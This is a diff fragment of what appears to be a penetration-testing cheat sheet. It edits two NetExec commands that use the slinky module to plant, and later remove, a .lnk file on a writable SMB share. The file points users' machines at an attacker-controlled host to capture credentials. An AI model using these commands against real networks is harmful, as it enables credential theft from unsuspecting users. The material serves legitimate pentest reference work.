@@ -317,12 +317,12 @@ How to pentest like a Gunnaj
   
   ### Creates a lnk file for a share with read/write rights
   ```shell
-  NetExec -smb <Domain_Controller_IP_or_Target_Domain> -u <AD_user> -p <AD_password> -M slinky -o NAME=<filename> SERVER=<attacker_IP>
+  NetExec -smb <Domain_Controller_IP> -u <AD_user> -p <AD_password> -M slinky -o NAME=<filename> SERVER=<attacker_IP>
   ```
    
   ### Remove the lnk file
   ```basb
-  NetExec -smb <Domain_Controller_IP_or_Target_Domain> -u <AD_user> -p <AD_password> -M slinky -o NAME=<filename> SERVER=<attacker_IP> CLEANUP=True
+  NetExec -smb <Domain_Controller_IP> -u <AD_user> -p <AD_password> -M slinky -o NAME=<filename> SERVER=<attacker_IP> CLEANUP=True
   ```
     
 </details>
